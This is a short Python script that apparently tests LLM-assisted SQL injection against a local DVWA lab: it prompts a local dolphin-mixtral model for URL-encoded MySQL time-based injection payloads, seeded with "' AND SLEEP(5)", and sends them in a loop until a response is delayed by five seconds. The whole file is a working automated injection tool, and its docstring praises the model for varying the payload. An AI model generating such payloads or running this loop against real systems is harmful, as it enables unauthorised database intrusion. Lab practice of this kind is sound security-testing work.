from ollama import chat
import requests
import time
import re


"""
This model has mixed results. Sometimes it's responses are hard to grab and use reliably.  It did have some successes, 
and it was quicker in generating the payload then llama3.3 to test.  
This example found it quickly but many other attempts failed. It did morph the payload a bit, which was good.
"""


def generate_sql_injection_payload(url_endpoint):
    # Prepare the prompt asking for a SQL injection payload
    sleep_variant = "' AND SLEEP(5)"
    prompt = f"Can you provide me a different sql injection like this {sleep_variant} payload for mysql in the 'id' parameter in the following URL: {url_endpoint}? Only return the payload, no other text or markdown please. Also can you url encode it."
    #print(prompt)
    # Model Setup/Config
    messages = [
        {
            'role': 'user',
            'content': prompt
        }
    ]

    response = chat(
        model="dolphin-mixtral:8x7b",  
        messages=messages
    )

    llm_response = response['message']['content'] 
    #print(llm_response)
    match = re.search(r'```.*\n(.*?)\n```', llm_response)
    if match:
        payload = match.group(1)
        #print(f"payload: {payload}")
        return payload

def requester(url_endpoint):
    cookies = {
        'security':'low',
        'PHPSESSID':'581b25fa353038edda12bf865490647b'
    }
    try:
        r = requests.get(url_endpoint, cookies=cookies)
        return r
    except requests.exceptions.RequestException as e:
        print(f"Error fetching URL: {e}")
        return False    

def main():
    url_endpoint = "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#"
    try:
        while True:
            sql_payload = generate_sql_injection_payload(url_endpoint)
            start_time = time.time()
            url_endpoint = f"http://localhost/vulnerabilities/sqli/?id=1{sql_payload}&Submit=Submit#"
            r = requester(url_endpoint)
            end_time = time.time()
            elapsed_time = end_time - start_time
            formatted_time = f"{elapsed_time:.2f}"
            print(f"{formatted_time} {url_endpoint}")
            if elapsed_time >= 5:
                break
        print(f"[+] SQL Injection Found! {url_endpoint}") 
            

    except requests.exceptions.RequestException as e:
        print(f"Error fetching URL: {e}")

if __name__ == "__main__":
    begin_runtime = time.time()
    main()
    end_runtime = time.time()
    runtime = end_runtime - begin_runtime
    print(f"Runtime: {runtime:.2f}") # two decimal places
